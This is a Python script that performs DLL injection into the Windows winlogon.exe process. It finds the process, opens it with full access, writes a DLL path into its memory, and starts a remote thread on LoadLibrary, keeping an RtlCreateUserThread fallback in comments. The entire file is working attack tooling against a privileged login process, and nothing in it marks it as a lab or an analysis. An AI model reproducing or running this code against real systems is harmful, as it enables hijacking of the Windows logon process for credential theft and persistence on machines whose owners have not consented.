from ctypes import *
from ctypes.wintypes import *

# dllll
kernel32 = windll.kernel32
ntdll = windll.ntdll
    
NTSTATUS = DWORD
PHANDLE = POINTER(HANDLE)
PVOID = LPVOID = ULONG_PTR = c_void_p
FARPROC = CFUNCTYPE(None)
SIZE_T = ULONG_PTR
PSIZE_T = POINTER(SIZE_T)

# Define
TH32CS_SNAPPROCESS = 0x02
PROCESS_ALL_ACCESS =  0x1F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
    
kernel32.VirtualAllocEx.restype = LPVOID
kernel32.WriteProcessMemory.argtypes = [HANDLE, LPVOID, LPCVOID, DWORD, PVOID]
kernel32.GetModuleHandleW.restype = HMODULE
kernel32.GetProcAddress.argtypes = [HMODULE, LPCSTR]
kernel32.GetProcAddress.restype = LPVOID
kernel32.CreateRemoteThread.argtypes = [HANDLE, LPVOID, ULONG_PTR, LPCVOID, LPCVOID, DWORD, LPDWORD]

ntdll.RtlCreateUserThread.argtypes = [HANDLE, LPVOID, BOOL, ULONG, LPDWORD, LPDWORD, LPVOID, LPVOID, LPVOID, LPVOID]
ntdll.RtlCreateUserThread.restype = BOOL
    
# Structures
class PROCESSENTRY32(Structure):
    _fields_ = [
        ("dwSize", DWORD),
        ("cntUsage", DWORD),
        ("th32ProcessID", DWORD),
        ("th32DefaultHeapID", ULONG_PTR),
        ("th32ModuleID", DWORD),
        ("cntThreads", DWORD),
        ("th32ParentProcessID", DWORD),
        ("pcPriClassBase", LONG),
        ("dwFlags", DWORD),
        ("szExeFile", CHAR * MAX_PATH),
    ]

def get_winlogon_pid():
    pe = PROCESSENTRY32()
    pe.dwSize = sizeof(PROCESSENTRY32)

    process_snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

    try:
        ret = kernel32.Process32First(process_snapshot, byref(pe))
        if b"winlogon.exe" in pe.szExeFile:
            return pe.th32ProcessID
        
        while kernel32.Process32Next(process_snapshot, byref(pe)):
            #print(pe.szExeFile)
            if b"winlogon.exe" in pe.szExeFile:
                return pe.th32ProcessID
            
        print("winlogon.exe PID not found")
        return None
    finally:
        kernel32.CloseHandle(process_snapshot)

## Working
def inject_dll():
    dll_path = b"C:\PATH\FILENAME.dll"
    print("[*] DLL Path: " + str(dll_path, "utf-8"))

    winlogon_pid = get_winlogon_pid()
    print("[*] winlogon.exe PID: + " + str(winlogon_pid))

    process_handle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, winlogon_pid)
    print("[*] Process Handle: " + str(process_handle))

    alloc_mem = kernel32.VirtualAllocEx(process_handle, None, len(dll_path), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if not alloc_mem:
        raise WinError()
    print("[*] Memory allocated for DLL path: " + str(hex(alloc_mem)))

    res = kernel32.WriteProcessMemory(process_handle, alloc_mem, dll_path, len(dll_path), None)
    if not res:
        raise WinError()
    
    k32_module_addr = kernel32.GetModuleHandleW("Kernel32")
    if not k32_module_addr:
        raise WinError()

    l = [b"LoadLibraryExA", b"LoadLibraryExW", b"LoadLibraryW", b"LoadLibrary", b"LoadLibraryA"]
    for lib_name in l:
        name = l.pop()
        load_lib_addr = kernel32.GetProcAddress(k32_module_addr, name)

        if load_lib_addr:
            print("[*] Function name: " + str(name))
            break

    if not load_lib_addr:
        raise WinError()

    print("[*] kernel32.dll: {}, LoadLibrary: {}".format(hex(k32_module_addr), hex(load_lib_addr)))

    input("[*] Press any key for DLL INJECTION >>>>>")
    thread_handle = kernel32.CreateRemoteThread(process_handle, None, None, load_lib_addr, alloc_mem, 0, None)
    print("[*] Thread Handle: " + str(thread_handle))
    if not thread_handle:
        raise WinError()
    
    # TODO: When CreateRemoteThread does not work, use this as a workaround
    #thread_handle = HANDLE()
    #ntdll.RtlCreateUserThread(process_handle, None, 0, 0, None, None, load_lib_addr, alloc_mem, byref(thread_handle), None)

    if kernel32.WaitForSingleObject(thread_handle, 0xFFFFFFFF) == 0xFFFFFFFF:
        raise WinError()
